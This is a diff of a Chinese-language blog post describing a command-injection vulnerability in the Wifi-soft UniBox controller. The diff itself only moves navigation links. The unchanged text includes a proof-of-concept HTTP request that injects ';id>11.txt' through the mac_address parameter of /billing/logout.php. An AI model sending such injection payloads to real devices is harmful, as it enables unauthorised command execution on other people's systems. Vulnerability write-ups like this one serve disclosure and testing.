@@ -51,14 +51,6 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命[漏洞](ht
 ?>
 ```
 
-深入探索
-
-数据管理
-
-黑客与破解
-
-VPN
-
 很明显的当 `logout_user=` 时，直接将 `mac_address` 拼接进 `exec` 中执行，无任何过滤和校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
@@ -73,6 +65,14 @@ VPN
 GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
 Host: unibox.mrxn.net
 ```
+
+深入探索
+
+软件安全测试
+
+SQL注入防护
+
+在线工具箱
 
 访问[命令执行](https://mrxn.net/tag/rce "标签：命令执行")结果文件 `/billing/11.txt`
 
